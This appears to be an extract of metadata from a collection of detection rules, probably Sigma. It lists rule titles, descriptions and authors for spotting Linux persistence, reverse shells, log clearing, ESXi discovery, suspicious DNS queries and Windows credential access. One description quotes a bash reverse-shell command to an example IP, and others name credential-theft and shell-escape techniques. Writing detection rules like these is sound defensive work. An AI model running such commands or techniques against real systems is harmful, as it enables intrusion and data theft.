-a always,exit -F arch=b64 -S sysinfo -k discovery_sysinfo_syscall
-a always,exit -F arch=b32 -S sysinfo -k discovery_sysinfo_syscall

rules.author: Milad Cheraghi

rules.title: Program Executions in Suspicious Folders
rules.description: Detects program executions in suspicious non-program folders related to malware or hacking activity
rules.author: Florian Roth (Nextron Systems)

rules.title: Special File Creation via Mknod Syscall
rules.description:
Detects usage of the `mknod` syscall to create special files (e.g., character or block devices).
Attackers or malware might use `mknod` to create fake devices, interact with kernel interfaces,
or establish covert channels in Linux systems.
Monitoring the use of `mknod` is important because this syscall is rarely used by legitimate applications,
and it can be abused to bypass file system restrictions or create backdoors.
rules.author: Milad Cheraghi

rules.title: Webshell Remote Command Execution
rules.description: Detects possible command execution by web application/web shell

logsource.definition:
Required auditd configuration:
-a always,exit -F arch=b32 -S execve -F euid=33 -k detect_execve_www
-a always,exit -F arch=b64 -S execve -F euid=33 -k detect_execve_www
-a always,exit -F arch=b32 -S execveat -F euid=33 -k detect_execve_www
-a always,exit -F arch=b64 -S execveat -F euid=33 -k detect_execve_www
Change the number "33" to the ID of your WebServer user. Default: www-data:x:33:33

rules.description: Detects creation of cron file or files in Cron directories which could indicates potential persistence.

rules.description: Detects creation of sudoers file or files in "sudoers.d" directory which can be used a potential method to persiste privileges for a specific user.

Detects files with specially crafted filenames that embed Base64-encoded bash payloads designed to execute when processed by shell scripts.
These filenames exploit shell interpretation quirks to trigger hidden commands, a technique observed in VShell malware campaigns.
rules.author: @kostastsale

rules.description: Detects the creation of shell scripts under the "profile.d" path.
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk

rules.description: Detects the creation of the file "rootlog" which is used by the TripleCross rootkit as a way to check if the backdoor is already running.
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Triple Cross eBPF Rootkit Default Persistence
rules.description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d" directories. Which both are related to the TripleCross persistence method

rules.title: Wget Creating Files in Tmp Directory
rules.description: Detects the use of wget to download content in a temporary directory such as "/tmp" or "/var/tmp"
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk

rules.title: Linux Reverse Shell Indicator
rules.description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
rules.author: Florian Roth (Nextron Systems)

rules.title: Linux Crypto Mining Pool Connections
rules.description: Detects process connections to a Monero crypto mining pool
rules.author: Florian Roth (Nextron Systems)

rules.title: Communication To LocaltoNet Tunneling Service Initiated - Linux
rules.description:
Detects an executable initiating a network connection to "LocaltoNet" tunneling sub-domains.
LocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.
Attackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.
rules.author: Andreas Braathen (mnemonic.io)

rules.title: Communication To Ngrok Tunneling Service - Linux
rules.description: Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors
rules.author: Florian Roth (Nextron Systems)

rules.title: Potentially Suspicious Malware Callback Communication - Linux
rules.description: Detects programs that connect to known malware callback ports based on threat intelligence reports.
rules.author: hasselj

rules.title: Shell Invocation via Apt - Linux
rules.description:
Detects the use of the "apt" and "apt-get" commands to execute a shell or proxy commands.
Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Scheduled Task/Job At
rules.description:
Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
rules.author: Ömer Günal, oscd.community

rules.title: Audit Rules Deleted Via Auditctl
rules.description:
Detects the execution of 'auditctl' with the '-D' command line parameter, which deletes all configured audit rules and watches on Linux systems.
This technique is commonly used by attackers to disable audit logging and cover their tracks by removing monitoring capabilities.
Removal of audit rules can significantly impair detection of malicious activities on the affected system.
rules.author: Mohamed LAKRI

rules.title: Kaspersky Endpoint Security Stopped Via CommandLine - Linux
rules.description:
Detects execution of the Kaspersky init.d stop script on Linux systems either directly or via systemctl.
This activity may indicate a manual interruption of the antivirus service by an administrator, or it could be a sign of potential tampering or evasion attempts by malicious actors.
rules.author: Milad Cheraghi

rules.title: Suspicious Invocation of Shell via AWK - Linux
rules.description:
Detects the execution of "awk" or it's sibling commands, to invoke a shell using the system() function.
This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)

rules.title: Decode Base64 Encoded Text
rules.description: Detects usage of base64 utility to decode arbitrary base64-encoded text

rules.title: Linux Base64 Encoded Shebang In CLI
rules.description: Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Bash Interactive Shell
rules.description: Detects execution of the bash shell with the interactive flag "-i".

rules.title: Enable BPF Kprobes Tracing
rules.description: Detects common command used to enable bpf kprobes tracing

rules.title: BPFtrace Unsafe Option Usage
rules.description: Detects the usage of the unsafe bpftrace option
rules.author: Andreas Hunkeler (@Karneades)

rules.title: Linux Setgid Capability Set on a Binary via Setcap Utility
rules.description:
Detects the use of the 'setcap' utility to set the 'setgid' capability (cap_setgid) on a binary file.
This capability allows a non privileged process to make arbitrary manipulations of group IDs (GIDs), including setting its current GID to a value that would otherwise be restricted (i.e. GID 0, the root group).
This behavior can be used by adversaries to backdoor a binary in order to escalate privileges again in the future if needed.
rules.author: Luc Génaux

rules.title: Linux Setuid Capability Set on a Binary via Setcap Utility
rules.description:
Detects the use of the 'setcap' utility to set the 'setuid' capability (cap_setuid) on a binary file.
This capability allows a non privileged process to make arbitrary manipulations of user IDs (UIDs), including setting its current UID to a value that would otherwise be restricted (i.e. UID 0, the root user).
This behavior can be used by adversaries to backdoor a binary in order to escalate privileges again in the future if needed.
rules.author: Luc Génaux

rules.title: Capabilities Discovery - Linux
rules.description: Detects usage of "getcap" binary. This is often used during recon activity to determine potential binaries that can be abused as GTFOBins or other.
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Capsh Shell Invocation - Linux
rules.description: Detects the use of the "capsh" utility to invoke a shell.
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)

rules.title: Remove Immutable File Attribute
rules.description: Detects usage of the 'chattr' utility to remove immutable file attribute.
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Linux Sudo Chroot Execution
rules.description:
Detects the execution of 'sudo' command with '--chroot' option, which is used to change the root directory for command execution.
Attackers may use this technique to evade detection and execute commands in a modified environment.
This can be part of a privilege escalation strategy, as it allows the execution of commands with elevated privileges in a controlled environment as seen in CVE-2025-32463.
While investigating, look out for unusual or unexpected use of 'sudo --chroot' in conjunction with
rules.author: Swachchhanda Shrawn Poudel (Nextron Systems)

rules.title: Clear Linux Logs
rules.description: Detects attempts to clear logs on the system. Adversaries may clear system logs to hide evidence of an intrusion
rules.author: Ömer Günal, oscd.community

rules.title: Syslog Clearing or Removal Via System Utilities
rules.description: Detects specific commands commonly used to remove or empty the syslog. Which is a technique often used by attacker as a method to hide their tracks
rules.author: Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.title: Clipboard Collection with Xclip Tool
rules.description:
Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.
rules.author: Pawel Mazur, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.title: Copy Passwd Or Shadow From TMP Path
rules.description: Detects when the file "passwd" or "shadow" is copied from tmp path
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk

rules.title: Crontab Enumeration
rules.description: Detects usage of crontab to list the tasks of the user
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk

rules.title: Remove Scheduled Cron Task/Job
rules.description:
Detects usage of the 'crontab' utility to remove the current crontab.
This is a common occurrence where cryptocurrency miners compete against each other by removing traces of other miners to hijack the maximum amount of resources possible
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Linux Crypto Mining Indicators
rules.description: Detects command line parameters or strings often used by crypto miners
rules.author: Florian Roth (Nextron Systems)

rules.title: Curl Usage on Linux
rules.description: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: Suspicious Download and Execute Pattern via Curl/Wget
rules.description:
Detects suspicious use of command-line tools such as curl or wget to download remote
content - particularly scripts - into temporary directories (e.g., /dev/shm, /tmp), followed by
immediate execution, indicating potential malicious activity. This pattern is commonly used
by malicious scripts, stagers, or downloaders in fileless or multi-stage Linux attacks.
rules.author: Aayush Gupta

rules.title: DD File Overwrite
rules.description: Detects potential overwriting and deletion of a file using DD.
rules.author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.title: Potential Linux Process Code Injection Via DD Utility
rules.description: Detects the injection of code by overwriting the memory map of a Linux process using the "dd" Linux command.
rules.author: Joseph Kamau

rules.title: Ufw Force Stop Using Ufw-Init
rules.description: Detects attempts to force stop the ufw using ufw-init
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk

rules.title: Linux Doas Tool Execution
rules.description: Detects the doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does.
rules.author: Sittikorn S, Teoderick Contreras

rules.title: Shell Invocation via Env Command - Linux

rules.title: ESXi Network Configuration Discovery Via ESXCLI

rules.title: ESXi Storage Information Discovery Via ESXCLI

rules.title: ESXi Syslog Configuration Change Via ESXCLI

rules.title: ESXi System Information Discovery Via ESXCLI

rules.title: ESXi Account Creation Via ESXCLI

rules.author: Cedric Maurugeon

rules.title: ESXi VM List Discovery Via ESXCLI

rules.author: Cedric Maurugeon

rules.title: ESXi VM Kill Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "vm" and "kill" flag in order to kill/shutdown a specific VM.
rules.author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon

rules.title: ESXi VSAN Information Discovery Via ESXCLI

rules.author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon

rules.title: File and Directory Discovery - Linux

rules.title: Shell Execution via Flock - Linux
rules.description: Detects the use of the "flock" command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Shell Execution GCC  - Linux

rules.title: Shell Execution via Git - Linux

rules.description: Detects execution of the "groupdel" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks

rules.title: Install Root Certificate

rules.title: OMIGOD SCX RunAsProvider ExecuteScript
rules.description:
Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.
Script being executed gets created as a temp file in /tmp folder with a scx* prefix.
Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.
The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including
Microsoft Operations Manager, Microsoft Az
rules.author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.title: OMIGOD SCX RunAsProvider ExecuteShellCommand
rules.description:
Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.
SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including
Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.
rules.author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.title: Potential Perl Reverse Shell Execution
rules.description: Detects execution of the perl binary with the "-e" flag and common strings related to potential reverse shell activity
rules.author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)

rules.title: Potential PHP Reverse Shell
rules.description:
Detects usage of the PHP CLI with the "-r" flag which allows it to run inline PHP code. The rule looks for calls to the "fsockopen" function which allows the creation of sockets.
Attackers often leverage this in combination with functions such as "exec" or "fopen" to initiate a reverse shell connection.
rules.author: @d4ns4n_

rules.title: Pnscan Binary Data Transmission Activity
rules.description:
Detects command line patterns associated with the use of Pnscan for sending and receiving binary data across the network.
This behavior has been identified in a Linux malware campaign targeting Docker, Apache Hadoop, Redis, and Confluence and was previously used by the threat actor known as TeamTNT
rules.author: David Burkett (@signalblur)

rules.title: Connection Proxy
rules.description: Detects setting proxy configuration
rules.author: Ömer Günal

rules.title: PUA - TruffleHog Execution - Linux
rules.description:
Detects execution of TruffleHog, a tool used to search for secrets in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used maliciously.
While it is a legitimate tool, intended for use in CI pipelines and security assessments,
It was observed in the Shai-Hulud malware campaign targeting npm packages to steal sensitive information.
rules.detection_summary: {'selection_img': {'Image|endswith': '/trufflehog'}, 'selection_cli_platform': {'CommandLine|contains': [' docker --image ', ' Git ', ' GitHub ', ' Jira ', ' Slack ', ' Confluence ', ' SharePoint ', ' s3 ', ' gcs ']}, 'selection_cli_verified': {'CommandLine|contains': ' --results=verified'}, 'condition': 'selection_img or all of selection_cli_*'}
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)

rules.title: Python WebServer Execution - Linux
rules.description:
Detects the execution of Python web servers via command line interface (CLI).
After gaining access to target systems, adversaries may use Python's built-in HTTP server modules to quickly establish a web server without requiring additional software.
This technique is commonly used in post-exploitation scenarios as it provides a simple method for transferring files between the compromised host and attacker-controlled systems.
rules.author: Mohamed LAKRI

rules.title: Python Spawning Pretty TTY Via PTY Module
rules.description: Detects a python process calling to the PTY module in order to spawn a pretty tty which could be indicative of potential reverse shell activity.

rules.title: Python Reverse Shell Execution Via PTY And Socket Modules
rules.description: Detects the execution of python with calls to the socket and pty module in order to connect and spawn a potential reverse shell.

rules.title: Inline Python Execution - Spawn Shell Via OS System Library

rules.title: Remote Access Tool - Team Viewer Session Started On Linux Host

Detects the command line executed when TeamViewer starts a session started by a remote host.
Once a connection has been started, an investigator can verify the connection details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.

Detects the use of systemctl mask to disable system power management targets such as suspend, hibernate, or hybrid sleep.
Adversaries may mask these targets to prevent a system from entering sleep or shutdown states, ensuring their malicious processes remain active and uninterrupted.
This behavior can be associated with persistence or defense evasion, as it impairs normal system power operations to maintain long-term access or avoid termination of malicious activity.

- Event ID 453: Package blocked by a platform policy.

logsource.definition: Requirements: The "Audit Directory Service Changes" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)

This detection should be correlated with network baselines and known legitimate ISATAP deployments in your

Registry hive dumping utilities such as QuarksPwDump were seen emitting this behavior.

rules.title: AppX Package Installation Attempts Via AppInstaller.EXE
rules.description: Detects DNS queries made by "AppInstaller.EXE". The AppInstaller is the default handler for the "ms-appinstaller" URI. It attempts to load/install a package from the referenced URL
rules.author: frack113

rules.title: Cloudflared Tunnels Related DNS Requests
rules.description:
Detects DNS requests to Cloudflared tunnels domains.
Attackers can abuse that feature to establish a reverse shell or persistence on a machine.
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: DNS Query To Common Malware Hosting and Shortener Services
rules.description:
Detects DNS queries to domains commonly used by threat actors to host malware payloads or redirect through URL shorteners.
These include platforms like Cloudflare Workers, TryCloudflare, InfinityFree, and URL shorteners such as tinyurl and lihi.cc.
Such DNS activity can indicate potential delivery or command-and-control communication attempts.
rules.author: Ahmed Nosir (@egycondor)

rules.title: DNS Query To Devtunnels Domain
rules.description: Detects DNS query requests to Devtunnels domains. Attackers can abuse that feature to establish a reverse shell or persistence on a machine.
rules.author: citron_ninja

rules.title: DNS Server Discovery Via LDAP Query
rules.description: Detects DNS server discovery via LDAP query requests from uncommon applications
rules.author: frack113

rules.title: DNS Query To AzureWebsites.NET By Non-Browser Process
rules.description: Detects a DNS query by a non browser process on the system to "azurewebsites.net". The latter was often used by threat actors as a malware hosting and exfiltration site.
rules.author: Nasreddine Bencherchali (Nextron Systems)

rules.title: DNS Query by Finger Utility
rules.description:
Detects DNS queries made by the finger utility, which can be abused by threat actors to retrieve remote commands for execution on Windows devices.
In one ClickFix malware campaign, adversaries leveraged the finger protocol to fetch commands from a remote server.
Since the finger utility is not commonly used in modern Windows environments, its presence already raises suspicion.
Investigating such DNS queries can also help identify potential malicious infrastructure used by threat actors for comma
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)

rules.title: Notepad++ Updater DNS Query to Uncommon Domains
rules.description:
Detects when the Notepad++ updater (gup.exe) makes DNS queries to domains that are not part of the known legitimate update infrastructure.
This could indicate potential exploitation of the updater mechanism or suspicious network activity that warrants further investigation.
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)

rules.title: DNS HybridConnectionManager Service Bus
rules.description: Detects Azure Hybrid Connection Manager services querying the Azure service bus service
rules.author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)

rules.title: Suspicious DNS Query Indicating Kerberos Coercion via DNS Object SPN Spoofing
rules.description:
Detects DNS queries containing patterns associated with Kerberos coercion attacks via DNS object spoofing.
The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds to a marshaled CREDENTIAL_TARGET_INFORMATION structure.
Attackers can use this technique to coerce authentication from victim systems to attacker-controlled hosts.
It is one of the strong indicators of a Kerberos coercion attack, where adversaries manipulate DNS records
to spoof Service Principal Names (SPNs) an
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)

rules.title: Suspicious Cobalt Strike DNS Beaconing - Sysmon
rules.description: Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons
rules.author: Florian Roth (Nextron Systems)

rules.title: DNS Query To MEGA Hosting Website
rules.description: Detects DNS queries for subdomains related to MEGA sharing website
rules.author: Aaron Greetham (@beardofbinary) - NCC Group

rules.title: DNS Query Request To OneLaunch Update Service
rules.description:
Detects DNS query requests to "update.onelaunch.com". This domain is associated with the OneLaunch adware application.
When the OneLaunch application is installed it will attempt to get updates from this domain.
rules.author: Josh Nickels

rules.title: DNS Query Request By QuickAssist.EXE
rules.description: Detects DNS queries initiated by "QuickAssist.exe" to Microsoft Quick Assist primary endpoint that is used to establish a session.
rules.author: Muhammad Faisal (@faisalusuf)

rules.title: DNS Query Request By Regsvr32.EXE
rules.description: Detects DNS queries initiated by "Regsvr32.exe"
rules.author: Dmitriy Lifanov, oscd.community

rules.title: DNS Query To Remote Access Software Domain From Non-Browser App
rules.description:
An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly use
rules.author: frack113, Connor Martin

rules.title: Suspicious DNS Query for IP Lookup Service APIs
rules.description: Detects DNS queries for IP lookup services such as "api.ipify.org" originating from a non browser process.
rules.author: Brandon George (blog post), Thomas Patzke

rules.title: TeamViewer Domain Query By Non-TeamViewer Application
rules.description: Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation)
rules.author: Florian Roth (Nextron Systems)

rules.title: DNS Query Tor .Onion Address - Sysmon
rules.description: Detects DNS queries to an ".onion" address related to Tor routing networks
rules.author: frack113

rules.title: DNS Query To Ufile.io
rules.description: Detects DNS queries to "ufile.io", which was seen abused by malware and threat actors as a method for data exfiltration
rules.author: yatinwad, TheDFIRReport

rules.title: DNS Query To Visual Studio Code Tunnels Domain
rules.description: Detects DNS query requests to Visual Studio Code tunnel domains. Attackers can abuse that feature to establish a reverse shell or persistence on a machine.
rules.author: citron_ninja

rules.title: Vulnerable WinRing0 Driver Load

rules.title: Credential Manager Access By Uncommon Applications

Detects suspicious processes based on name and location that access the windows credential manager and vault.
Which can be a sign of credential stealing. Example case would be usage of mimikatz "dpapi::cred" function

Detects file access requests to the Windows Credential History File by an uncommon application.
This can be a sign of credential stealing. Example case would be usage of mimikatz "dpapi::credhist" function

rules.title: Suspicious File Access to Browser Credential Storage
rules.description:
Detects file access to browser credential storage paths by non-browser processes, which may indicate credential access attempts.
Adversaries may attempt to access browser credential storage to extract sensitive information such as usernames and passwords or cookies.
This behavior is often commonly observed in credential stealing malware.
rules.author: frack113, X__Junior (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems), Parth-FourCore

rules.title: Microsoft Teams Sensitive File Access By Uncommon Applications
rules.description: Detects file access attempts to sensitive Microsoft teams files (leveldb, cookies) by an uncommon process.

logsource.definition: Requirements: Microsoft-Windows-Kernel-File ETW provider

rules.author: @SerkinValery

rules.title: Unusual File Modification by dns.exe
rules.description: Detects an unexpected file being modified by dns.exe which my indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)
rules.author: Tim Rauch (Nextron Systems), Elastic (idea)

rules.title: Backup Files Deleted
rules.description: Detects deletion of files with extensions often used for backup files. Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.
rules.author: frack113

rules.title: EventLog EVTX File Deleted

rules.description: Detects the deletion of the "Zone.Identifier" ADS by an uncommon process. Attackers can leverage this in order to bypass security restrictions that make use of the ADS such as Microsoft Office apps.
